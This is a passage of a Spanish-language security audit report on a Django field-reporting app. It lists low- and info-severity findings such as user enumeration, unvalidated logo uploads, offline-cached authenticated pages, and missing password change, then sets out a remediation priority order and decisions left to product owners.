invitado = get_user_model().objects.filter(username=username).first()
if invitado is None:
    messages.error(request, f"No existe un usuario con el nombre «{username}».")
```

**Attack scenario**
Un usuario interno itera nombres para mapear la nómina completa, insumo
directo para F-03 (fuerza bruta) o para ingeniería social.

**Potential impact**
Bajo por sí solo. Su valor es como insumo de F-03.

**Existing mitigation**
Requiere estar autenticado y ser creador de al menos un reporte. La
severidad es LOW justamente por eso: el atacante ya está dentro. Además, el
mensaje específico tiene valor de usabilidad real — distinguir "escribí mal
el nombre" de "ya estaba invitado" es información legítima.

**Recommended remediation**
Es un compromiso deliberado, no un error. Dejarlo como está es defendible
si F-03 se cierra. Si se quiere cerrar: mensaje neutro ("Si el usuario
existe, ya tiene acceso") a costa de la usabilidad, o —mejor— un selector
con autocompletado sobre la nómina, que elimina el problema al no requerir
adivinar.

**Suggested verification**
N/A si se acepta.

**Required change type** `ACCEPT RISK`

---

**ID** F-09
**Title** Plantillas `.xlsx` y logos de administrador se aceptan sin validar tipo ni tamaño
**Estado** RESUELTO PARCIALMENTE (2026-09-01) — el logo indecodificable ahora lanza `LogoIlegible` en vez de un 500; 1 test. Falta la validación de tipo/tamaño en la subida.
**Severity** LOW
**Confidence** HIGH
**Category** Unrestricted file upload / insecure error handling
**Affected artifact** Código
**Location** `tipos_reporte/forms.py:28-59` (`TipoDeReporteForm`);
`tipos_reporte/generador.py:129-149` (`_intercambiar_logo`)

**Description**
`TipoDeReporteForm` expone `logo` y `plantilla` como campos de `ModelForm`
sin validador de tamaño ni de tipo propio. A diferencia de `Adjunto` (que
al menos tiene los dos controles de `validar_adjunto`), acá no hay ninguno.

Además, `_intercambiar_logo` llama a `ImagenOpenpyxl(BytesIO(logo.read()))`
**sin `try/except`**, a diferencia de `_incrustar_adjuntos`
(`generador.py:187-194`), que sí lo envuelve. Un logo que Pillow no pueda
decodificar hace que `generar_reporte` levante una excepción que **no** es
`ProblemaDeGeneracion`, así que `views.generar` no la captura y el usuario
recibe un 500 crudo — exactamente el modo de falla que el diseño D6 prohíbe.

**Evidence**
`fields = ("nombre", "codigo", "version_formato", "logo", "plantilla")` sin
`clean_logo`/`clean_plantilla`. Comparar `generador.py:146`
(`nueva = ImagenOpenpyxl(BytesIO(logo.read()))`, desnudo) contra
`generador.py:187-194` (envuelto en `try/except Exception: continue`).

**Attack scenario**
Un administrador —o una sesión administradora comprometida vía F-03— sube
un archivo arbitrario como `logo`. Todas las generaciones de ese tipo de
reporte pasan a fallar con 500. Es una denegación de servicio persistente
sobre la función central del producto, disparable por accidente (subir un
`.svg` pensando que es una imagen válida) tanto como a propósito.

**Potential impact**
Rotura persistente de la generación para un tipo de reporte, con 500 en vez
de mensaje. Requiere rol administrador, de ahí LOW.

**Existing mitigation**
`solo_administradores` gatea todas las rutas. `plantilla` queda bloqueada
una vez que hay definición activa (design D4), lo que limita la ventana.
La lectura de la plantilla sí está protegida (`PlantillaIlegible`).

**Recommended remediation**

1. Envolver `_intercambiar_logo` igual que `_incrustar_adjuntos`, o mejor:
   convertir el fallo en `ProblemaDeGeneracion` para que `views.generar`
   degrade a mensaje. Es un arreglo de tres líneas y cierra el 500.
2. Agregar validadores de tamaño y de tipo real a `logo` y `plantilla`,
   reutilizando la verificación por firma que propone F-04.

**Suggested verification**
Test de que `generar_reporte` con un `logo` indecodificable levanta
`ProblemaDeGeneracion` y no una excepción cruda. Test de que
`views.generar` responde con redirect + mensaje, no 500.

**Required change type** `CODE FIX`

---

**ID** F-10
**Title** El service worker sirve HTML autenticado cacheado sin verificación de sesión
**Estado** ACEPTADO por el dueño del producto (2026-09-01); premisa corregida en ADR-0005.
**Severity** LOW
**Confidence** MEDIUM
**Category** Sensitive data exposure (dispositivo compartido o perdido)
**Affected artifact** Arquitectura (ADR-0004, ADR-0005); código
**Location** `reportes/templates/reportes/sw.js:95-116` y `:50-69`

**Description**
El SW cachea el HTML renderizado de cada paso del wizard —que contiene los
datos del reporte— y lo sirve desde caché cuando la red falla. Sin red no
hay forma de validar la sesión, así que **el HTML del último usuario se
muestra a quien tenga el dispositivo**. Lo mismo aplica a los borradores en
IndexedDB.

La purga existe pero tiene un único disparador: navegar a `/login/`
(`sw.js:51`). Cubre el logout explícito (`LOGOUT_REDIRECT_URL = "login"`
produce esa navegación) y el caso online de sesión expirada. **No** cubre
el escenario que importa: dispositivo perdido, abierto sin señal, donde la
redirección a `/login/` nunca ocurre porque no hay red.

**Evidence**
`sw.js:110-114`: el `.catch()` devuelve `caches.match(solicitud)` sin
ninguna comprobación previa. Por construcción no puede haberla — es la
naturaleza del modo offline, no un descuido de implementación.

**Attack scenario**
Un teléfono de faena se pierde o se comparte entre turnos. Quien lo levanta
abre la aplicación en modo avión y navega a un paso visitado antes: ve los
datos completos del reporte de otra persona. Sin PIN, sin bloqueo, sin
rastro.

**Potential impact**
Lectura de reportes ajenos en un dispositivo perdido o compartido. Acotado
a lo que ese dispositivo ya había visitado.

**Existing mitigation**
La purga en `/login/` cubre la rotación normal de usuario. ADR-0005 acepta
este riesgo de forma explícita y razonada ("se prioriza no bloquear al
usuario en el frente de trabajo"), y es un compromiso legítimo: exigir un
PIN local contradice el propósito del modo offline.

**Confianza MEDIUM — lo que falta para confirmarlo:** no verifiqué el
comportamiento real en un dispositivo con la aplicación instalada; el
análisis es sobre el código del SW. Tampoco sé si los dispositivos de faena
tienen bloqueo de pantalla y cifrado del sistema operativo por política —
si lo tienen, el riesgo residual es mucho menor y este finding puede
cerrarse sin cambios.

**Recommended remediation**
Ninguna acción de código recomendada por defecto: la decisión de ADR-0005
es coherente. Lo que sí corresponde es **revisar la aceptación con la
premisa corregida de F-05** (ahora hay fotos) y, si la conclusión no
cambia, dejarlo escrito. Si se quisiera reducir sin romper el offline:
purgar el caché de navegación al superar `SESSION_COOKIE_AGE` medido
localmente, lo que no requiere red.

**Suggested verification**
Verificación manual: iniciar sesión, visitar un paso, pasar a modo avión,
borrar la cookie, navegar al paso.

**Required change type** `ACCEPT RISK`

---

**ID** F-11
**Title** Un administrador puede quedar fuera de la administración degradando su propio rol
**Estado** RESUELTO (2026-09-01) — guarda en `usuarios_editar`; 3 tests.
**Severity** LOW
**Confidence** HIGH
**Category** Availability / insecure default
**Affected artifact** Código
**Location** `usuarios/views.py:72-88` (`usuarios_editar`);
`usuarios/forms.py:52-58` (`UsuarioEditarForm`)

**Description**
`usuarios_suspender` bloquea explícita y correctamente la auto-suspensión
(`usuarios/views.py:128-130`), con un razonamiento escrito sobre por qué no
hace falta un chequeo de "último administrador". Ese mismo razonamiento no
se aplicó a `usuarios_editar`: nada impide que un administrador cambie su
propio `rol` a `usuario`. Si es el único, nadie queda con acceso a la
administración de usuarios ni a la de tipos de reporte.

**Evidence**
`UsuarioEditarForm` expone `fields = ("rol",)` sin ninguna validación sobre
el actor; `usuarios_editar` no compara `usuario.id` con `request.user.id`,
a diferencia de `usuarios_suspender`, que sí lo hace.

**Attack scenario**
Más probable por error que por ataque: un administrador editando su propia
ficha cambia el rol sin advertencia. Recuperarse exige acceso directo a la
base o `manage.py` contra producción.

**Potential impact**
Pérdida de acceso administrativo, recuperable solo fuera de la aplicación.
Sin pérdida de datos.

**Existing mitigation**
`createsuperuser` sigue disponible para quien tenga acceso al entorno.

**Recommended remediation**
Replicar en `usuarios_editar` la guarda que `usuarios_suspender` ya tiene:
rechazar el cambio cuando `usuario.id == request.user.id` y el rol nuevo no
sea administrador. Cuatro líneas, simétricas con código que ya existe.

**Suggested verification**
Test de que un administrador editándose a sí mismo a `rol="usuario"` recibe
error y conserva el rol.

**Required change type** `CODE FIX`

### INFO

---

**ID** F-12
**Title** `.env` no está listado en `.vercelignore`
**Estado** RESUELTO (2026-09-01) — patrones agregados + `test_a15`.
**Severity** INFO
**Confidence** LOW
**Category** Secrets handling
**Affected artifact** Configuración de despliegue
**Location** `.vercelignore`

**Description**
`.gitignore` excluye `.env*` correctamente, y hay un test que lo verifica.
`.vercelignore` **no** lo hace: lista `.venv/`, `__pycache__/`, `media/`,
`staticfiles/`, `*.pyc`, `.pytest_cache/`, `node_modules/` y nada más.
Cuando existe un `.vercelignore`, la CLI de Vercel lo usa en lugar de
`.gitignore` para decidir qué sube. El repositorio está vinculado
(`.vercel/project.json` existe), así que un `vercel deploy` desde una
laptop es un flujo plausible.

**Confianza LOW — lo que falta para confirmarlo:** no pude verificar (a) si
los despliegues se hacen por integración Git —en cuyo caso `.env` nunca se
sube y esto es inocuo— o por CLI, ni (b) si la versión de CLI en uso aplica
su exclusión propia de archivos `.env`, que existe como comportamiento por
defecto. No abrí `.env` para inspeccionar su contenido. Cualquiera de esas
dos condiciones cierra el hueco.

**Attack scenario**
Si los despliegues se hacen por CLI y la exclusión por defecto no aplica,
`.env` —con `DJANGO_SECRET_KEY`, `DATABASE_URL` y `BLOB_READ_WRITE_TOKEN`—
viaja al bundle del despliegue.

**Potential impact**
Alto si se confirma; por eso vale la pena resolver la incertidumbre aunque
la probabilidad sea baja.

**Existing mitigation**
`.gitignore` cubre el repositorio. Vercel excluye `.env` por defecto en la
CLI, lo que probablemente ya cierra esto.

**Recommended remediation**
Agregar `.env` y `.env.*` a `.vercelignore`. Es una línea, cuesta nada, y
elimina la dependencia de un comportamiento por defecto de una herramienta
externa. Coherente con el criterio fail-loud que el proyecto ya aplica en
`require_bool_env`.

**Suggested verification**
Extender `config/tests/test_deployment_hygiene.py::test_a9` para afirmar
que `.vercelignore` contiene el patrón.

**Required change type** `CODE FIX`

---

**ID** F-14
**Title** El entorno de desarrollo corre Python 3.14; producción corre 3.12
**Severity** INFO
**Confidence** HIGH
**Category** Configuration drift / insecure defaults
**Affected artifact** Entorno local (`.venv`); `.python-version`; `README.md`
**Location** `.venv/` vs `.python-version`

**Description**
Hallazgo lateral, encontrado al analizar F-07. `.python-version` fija `3.12`
y el README lo explica con todas las letras:

> "Vercel despliega con esa misma versión, así que desarrollar en otra abre
> la puerta a que algo funcione en tu máquina y falle en producción."

El `.venv` de esta máquina corre **Python 3.14.6**. Es exactamente la
situación contra la que el README advierte, y nadie la detecta porque nada la
verifica.

**Evidence**

```
$ cat .python-version
3.12

$ .venv/Scripts/python.exe -c "import sys; print(sys.version)"
3.14.6 (tags/v3.14.6:c63aec6, Jun 10 2026, 10:26:10) [MSC v.1944 64 bit (AMD64)]
```

`pyproject.toml` declara `requires-python = ">=3.12"`, que acepta 3.14 sin
protestar — el piso está fijado, el techo no.

**Attack scenario**
No es un vector de ataque; es un multiplicador de riesgo. Los tests que
respaldan cada control de seguridad de este informe se están ejecutando en un
intérprete distinto al de producción. Un cambio de comportamiento entre 3.12
y 3.14 —en `re`, en `zipfile`, en el manejo de rutas— puede hacer que un test
pase acá y el control falle desplegado. Y bloquea la generación correcta del
lockfile de F-07.

**Potential impact**
Falsa confianza en la suite de tests. Divergencia silenciosa entre lo
verificado y lo desplegado.

**Existing mitigation**
`.python-version` existe y el README lo documenta. Ninguno de los dos se
verifica automáticamente.

**Recommended remediation**
Recrear el `.venv` con Python 3.12 y correr la suite completa ahí antes de
confiar en estos resultados. Después, un test que lea `.python-version` y lo
compare contra `sys.version_info`, para que la deriva falle en vez de pasar
desapercibida — el mismo criterio fail-loud que ya usa `require_bool_env`.

**Suggested verification**
Test que afirme que `sys.version_info[:2]` coincide con `.python-version`.

**Required change type** `PROCESS / HARNESS CHANGE`

---

**ID** F-13
**Title** Un usuario no puede cambiar su propia contraseña
**Estado** ABIERTO — descartado por el dueño del producto (2026-09-01).
**Severity** INFO
**Confidence** HIGH
**Category** Missing security requirement
**Affected artifact** Producto / requisitos; ADR-0005
**Location** `usuarios/urls.py` (sin rutas de `PasswordChangeView`)

**Description**
El URLconf expone `login/` y `logout/`, más las pantallas de
administración. No hay `PasswordChangeView` ni flujo de reseteo. La única
forma de cambiar una contraseña es que un administrador la fije por
`usuarios_resetear_password` — lo que significa que **el administrador
conoce la contraseña de cada usuario** en el momento del reseteo, y que un
usuario que sospecha que su contraseña se filtró no puede reaccionar solo.

ADR-0005 dice que "login, reseteo de contraseña, permisos y gestión de
usuarios provienen de Django sin desarrollo propio" — el reseteo por parte
del usuario está en la decisión, pero no llegó al código.

**Evidence**
`usuarios/urls.py`: solo `LoginView` y `LogoutView` de
`django.contrib.auth.views`. `config/urls.py` no incluye
`django.contrib.auth.urls`.

**Potential impact**
Contraseñas compartidas de hecho entre usuario y administrador; sin
capacidad de rotación autónoma. Relevante junto a F-03.

**Existing mitigation**
Django invalida las demás sesiones al cambiar la contraseña
(`_auth_user_hash` en sesión), así que el reseteo administrativo sí expulsa
al atacante. La brecha es de autonomía, no de mecanismo.

**Recommended remediation**
Incluir `PasswordChangeView`/`PasswordChangeDoneView` con una entrada en el
sidebar. Es Django de fábrica: rutas y dos plantillas. El reseteo por email
no aplica si `Usuario` no tiene email confiable — verificar antes.

**Suggested verification**
Test de que un usuario autenticado puede cambiar su contraseña y que la
anterior deja de servir.

**Required change type** `PRODUCT / REQUIREMENT CHANGE`

## Prioridad

El orden recomendado no coincide con el de severidad, porque hay
dependencias entre findings y porque el esfuerzo es muy desparejo.

| # | Finding | Por qué en este lugar |
|---|---|---|
| 1 | **F-03** login sin límite de intentos | Es la puerta. Mientras esté abierta, el rol de administrador es alcanzable, y eso convierte a F-09 y al reseteo de contraseñas en consecuencias, no en findings independientes. Además F-08 solo importa si F-03 sigue abierto. |
| 2 | **F-01** inyección de fórmulas | Es el más barato de los graves —una neutralización en un único punto de escritura— y el único cuyo daño ocurre **fuera** de la organización, donde no hay forma de detectarlo ni de revertirlo. |
| 3 | **F-02** CDN sin SRI + CSP ausente | Grave, pero requiere un evento upstream. Auto-hospedar las tres bibliotecas es mecánico; la CSP es más trabajo por los `<script>` inline y conviene arrancarla en `Report-Only`. Hacer la parte 1 sin esperar a la 2. |
| 4 | **F-09** logo indecodificable → 500 | Tres líneas, y cierra el modo de falla que el propio diseño D6 prohíbe. Se resuelve en el mismo PR que F-01: mismo archivo, mismo contexto mental. |
| 5 | **F-11** auto-degradación de rol | Cuatro líneas, simétricas con una guarda que ya existe al lado. Mismo PR que F-03. |
| 6 | **F-12** `.env` en `.vercelignore` | Una línea. Costo cero, y resuelve una incertidumbre en vez de arrastrarla. |
| 7 | **F-04** content-type falsificable | Requiere verificación por firma y decidir cómo derivar la extensión. Su impacto real depende de F-05: si los blobs pasan a ser privados, buena parte del escenario se cae solo. |
| 8 | **F-07** dependencias sin lock | Cambio de proceso, no de código. Alto valor, sin urgencia de calendario. |
| 9 | **F-06** adjuntos sin tope de abuso | Necesita un número que solo alguien con datos de uso real puede elegir. Mitigable de inmediato con una alerta de gasto en Vercel, fuera del código. |
| 10 | **F-05, F-10, F-13, F-08** | Decisiones humanas — ver la sección siguiente. |

**Un PR de cierre rápido** podría cubrir F-01 + F-09 + F-11 + F-12: cuatro
findings, unas veinte líneas modificadas y cuatro tests. Vale la pena
hacerlo antes de abrir las discusiones de diseño.

## Gobernanza / Decisión requerida

Cuatro findings **no puedo resolverlos**: dependen de una decisión de
producto, de arquitectura, o de una aceptación de riesgo que no me
corresponde tomar.

**El punto que conviene mirar primero, porque conecta dos de ellos.**
ADR-0005 aceptó explícitamente el riesgo de datos cacheados en un
dispositivo perdido, justificándolo en que se trata de "reportes de control
de calidad, **sin datos personales sensibles de terceros**". Esa premisa era
correcta cuando se escribió. El backlog #11 incorporó después fotografías
tomadas en faena, que pueden contener rostros, patentes, documentación y
geolocalización EXIF. **La premisa cambió y la decisión nunca se
re-examinó.** Puede perfectamente ser que, revisada, la conclusión siga
siendo la misma —es un compromiso defendible— pero hoy está sostenida por
una afirmación que dejó de ser cierta, y eso es distinto de estar aceptada.

- **F-05 — Adjuntos en URLs públicas no revocables.** `DESIGN / ADR CHANGE`.
  Requiere decidir entre blobs privados con vista access-scoped (correcto,
  cuesta latencia y trabajo), strip de EXIF + borrado en cascada
  (mitigación parcial, barata), o aceptación formal con la premisa
  corregida. Las dos últimas son compatibles.
- **F-10 — HTML autenticado cacheado accesible offline.** `ACCEPT RISK`.
  Inherente al modo offline; no hay arreglo que no lo contradiga. La
  decisión es si la aceptación de ADR-0005 sigue en pie ahora que hay
  fotos, y si los dispositivos de faena tienen bloqueo y cifrado por
  política — dato que no está en el repositorio.
- **F-06 — Adjuntos sin tope de abuso.** `PRODUCT / REQUIREMENT CHANGE`.
  La spec prohibió un límite de cantidad; hace falta decidir si eso incluía
  también prohibir un límite de abuso, y con qué número. Requiere conocer
  el uso real en faena.
- **F-13 — Sin cambio de contraseña autogestionado.** `PRODUCT / REQUIREMENT CHANGE`.
  Decisión de alcance: hoy el administrador conoce la contraseña de cada
  usuario al resetearla, y nadie puede rotar la suya sin pedirlo.

**F-08** (enumeración de usuarios) quedó marcado `ACCEPT RISK` con una
recomendación explícita de aceptarlo si F-03 se cierra: el mensaje
específico tiene valor de usabilidad real y el atacante ya está
autenticado. Lo dejo señalado, no resuelto.

---

*Pase de seguridad ejecutado sobre el árbol de trabajo en
`docs/auditoria-y-rescate-specs`. Solo análisis: no se modificó código,
specs, configuración ni documentación. Este archivo es el único agregado.*

*Sobre los límites de este informe: es una revisión de código y documentos,
no un pentest. No se ejecutaron exploits contra un entorno desplegado, no se
hizo fuzzing, y la configuración de producción en Vercel y Neon no es
observable desde el repositorio. Un finding con `Confidence: HIGH` significa
que el mecanismo está verificado en el código —F-01 se comprobó ejecutando
openpyxl—, no que se haya demostrado explotable en producción.*
